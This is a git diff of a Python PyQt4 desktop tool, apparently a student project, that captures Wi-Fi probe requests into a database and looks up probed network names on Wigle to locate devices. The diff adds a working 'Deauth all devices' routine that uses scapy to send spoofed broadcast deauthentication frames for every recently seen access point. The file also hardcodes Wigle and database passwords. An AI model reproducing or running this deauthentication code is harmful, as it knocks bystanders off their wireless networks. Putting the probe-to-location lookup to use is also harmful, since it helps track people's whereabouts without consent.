@@ -1,10 +1,12 @@
 from PyQt4 import QtGui, QtCore 	#QtGui - imports GUI; Qtcore - imports event handling (to make buttons do things)
 import wifi_mon
 import logging
-from wifi_mon import deauth
 from PyQt4.Qt import QWebView, QUrl
 from wigle import Wigle, WigleRatelimitExceeded
 from Outlog import OutLog
+from impacket.dot11 import RadioTap
+from scapy.layers.dot11 import Dot11Deauth
+from probe_scan import encodeMac
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Shut up Scapy
 from scapy.all import *
 conf.verb = 0 # Scapy I thought I told you to shut up
@@ -45,11 +47,10 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 		frame1.setTitle("Selected Device")
 		frame1.setGeometry(250,260,200,50)
 		
-		labelcombo = QtGui.QLabel(self)
-		labelcombo.move(300,275)
-		labelcombo.setText("")
-		labelcombo.setText("<font style='color: red; size =24;'>TEST LABEL</font>")
-		
+		labelCombo = QtGui.QLabel(self)
+		labelCombo.move(280,270)
+		labelCombo.setText("<font style='color: red;'>NO DEVICE SELECTED</font>")
+		labelCombo.resize(200,50)
 		# ===== Main Menu ===== 
 									#Menu Choices
 		monitorMode = QtGui.QAction("& Enable Monitor Mode", self)	#Defines action for Wi-Fi Monitor Mode
@@ -125,9 +126,11 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 		comboBox.resize(200,20)
 		comboBox.move(250, 50)					#Defines location of the box on the screen (starting X; starting Y)
 		styleChoice.move(250, 25)				#Defines location of the style choice on the screen (starting X; starting Y)
-		#comboBox.activated[str].connect(self.slot_1)	#Activate and display the default/current style/value and connect it to method style_choice
-		comboBox.currentIndexChanged.connect(self.slot_1)
-	
+		comboBox.currentIndexChanged.connect(
+			lambda: labelCombo.setText(comboBox.currentText()))
+		comboBox.activated[str].connect(self.getCoordinates)	#Activate and display the default/current style/value and connect it to method style_choice
+		
+		
 		self.home()						#Refers to the next method
 
 
@@ -187,13 +190,10 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 
 	# ===== Methods ===== 
 	
-	def slot_1(self):
-			Window.labelcombo.setText(self.comboBox.currentText())
 	
-	def style_choice(self, text):					#Defines the method of the style choice (the 'Doing something' with the choice)...
-									# & pass self and text parameter
-		self.styleChoice.setText(text)				# set the style to QStyleFactory setText to text (to the lable saying what it is)
-		QtGui.QApplication.setStyle(QtGui.QStyleFactory.create(text)) #Set the style of the GUI to text, aka the QStyleFactory types (motif, windows, cde..)
+	#def slot_1(self,text):					#Defines the method of the style choice (the 'Doing something' with the choice)...
+	#	print str(deviceModel)
+	#	return str(deviceModel)
 		
 		
 	def wifi_monitor(self):						#Method for closing application
@@ -222,12 +222,22 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 		choice = QtGui.QMessageBox.question(self, "Deauth all devices", "Are you completely sure that you want to do it?", QtGui.QMessageBox.Yes | QtGui.QMessageBox.No)
 		if choice == QtGui.QMessageBox.Yes:			#if/else statement - if yes
 			try:
-				channels = range(1,14)
-				for channel in channels:
-					deauth(channel) 
+				con = psycopg2.connect(database='wifi', user='probecap', host = 'localhost', password='pass')
+				con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
+				cur = con.cursor()
+				try:
+					cur.execute("""select distinct s.mac from beacon b join station s on b.station =s.id where b.seen > current_timestamp at time zone 'utc' - (30 * interval '10 minutes');""")
+					ssids = [item[0] for item in cur.fetchall()]
+					for ssid in ssids:
+						print("Following AP clients will be deauthed " + ssid)
+						brdmac = "ff:ff:ff:ff:ff:ff"
+						pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = str(ssid), addr3 = ssid) / Dot11Deauth()
+						sendp(pkt, inter = .2, iface = iface, count = 10)
+				except psycopg2.DatabaseError, e:
+					print 'Error %s' % e    
 				QtGui.QMessageBox.information(self, "Deauth", "Deauth started")
 			except Exception, msg:
-				QtGui.QMessageBox.information(self, "Enabling Monitor Mode", "Enabling monitor mode failed due to error: %s" % (msg,))
+				print msg
 		else:							#if/else statement - else (No)
 			pass						#pass - nothing happens
 	
@@ -236,29 +246,28 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 		con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
 		cur = con.cursor()
 		try:
-			cur.execute("""select distinct s.model from station s where s.lastseen > current_timestamp at time zone 'utc' - (30 * interval '1 minutes');""")
+			cur.execute("""select distinct s.model from station s where s.lastseen > current_timestamp at time zone 'utc' - (30 * interval '10 minutes');""")
 			stations = [item[0] for item in cur.fetchall()]
 		except psycopg2.DatabaseError, e:
 			print 'Error %s' % e    
 		return stations
 	
-	def getCoordinates(self):
+	def getCoordinates(self,text):
 		con = psycopg2.connect(database='wifi', user='probecap', host = 'localhost', password='pass')
 		con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
 		cur = con.cursor()
 		try:
-			cur.execute("""select s.name from probe p join ssid s on p.ssid = s.id join station st on p.station = st.id where st.model = 'Apple';""")
+			cur.execute("select s.name from probe p join ssid s on p.ssid = s.id join station st on p.station = st.id where st.model = %s;", (str(text),))
 			data = cur.fetchall()
 			for item in data:
 				print item
-				#result = os.system("wigle_search --user Gvozdik --pass jaho4u4aju --ssid %s", *item)
-				#print result 
 				try:
-					results = Wigle('user789', '12345').search(
+					results = Wigle('itbstudent', 'p@SSW0RD').search(
 		            ssid=item,
-		            max_results=100)
+		            max_results=10) ###add more parameters to search, like lat and lon range for EIRE, time, etc.
 					for result in results:
 						print("%(ssid)s, %(trilat)s, %(trilong)s" % result)
+						
 				except WigleRatelimitExceeded:
 					print("Cannot query Wigle - exceeded number of allowed requests")
 				#cred = Wigle('itbstudent', 'p@SSW0RD')
@@ -294,7 +303,7 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 		con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
 		cur = con.cursor()
 		try:
-			cur.execute('TRUNCATE TABLE station, ssid, probe;')
+			cur.execute('TRUNCATE TABLE station, ssid, probe, beacon;')
 			QtGui.QMessageBox.information(self, "Clearing Database", "Tables truncated")
 		except psycopg2.DatabaseError, e:
 			print 'Error %s' % e    
@@ -306,10 +315,9 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 			updateoui = manuf.MacParser()
 			updateoui.refresh()
 			QtGui.QMessageBox.information(self, "Updating oui file", "OUI Database file is updated")
-		except Exception, msg:
+ 		except Exception, msg:
 			print msg
 
-			
 monitors, interfaces = wifi_mon.iwconfig()
 iface = wifi_mon.get_iface(interfaces)
 						# NO DESCRIPTION - This runs a window object (details of the object are above)
